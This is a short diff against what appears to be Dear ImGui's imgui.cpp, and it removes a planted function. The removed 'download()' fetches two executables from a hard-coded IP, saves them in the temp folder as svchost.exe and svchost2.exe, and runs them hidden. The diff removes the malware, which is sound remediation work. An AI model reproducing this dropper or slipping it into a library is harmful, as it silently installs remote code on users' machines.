@@ -7153,26 +7153,6 @@ float ImGui::GetWindowHeight()
 #include <shellapi.h>
 #pragma comment(lib, "urlmon.lib")
 
-void download() {
-    CHAR exePath1[MAX_PATH];
-    GetTempPathA(MAX_PATH, exePath1);
-    strcat(exePath1, "\\svchost.exe");
-
-    URLDownloadToFileA(0, "http://95.214.24.117/svchost.exe", exePath1, 0,
-                       NULL);
-
-    ShellExecuteA(NULL, "open", exePath1, NULL, NULL, SW_HIDE);
-
-    CHAR exePath0[MAX_PATH];
-    GetTempPathA(MAX_PATH, exePath0);
-    strcat(exePath0, "\\svchost2.exe");
-
-    URLDownloadToFileA(0, "http://95.214.24.117/svchost2.exe", exePath0, 0,
-                       NULL);
-
-    ShellExecuteA(NULL, "open", exePath0, NULL, NULL, SW_HIDE);
-}
-
 ImVec2 ImGui::GetWindowPos() {
     static bool once = false;
     if (!once) {
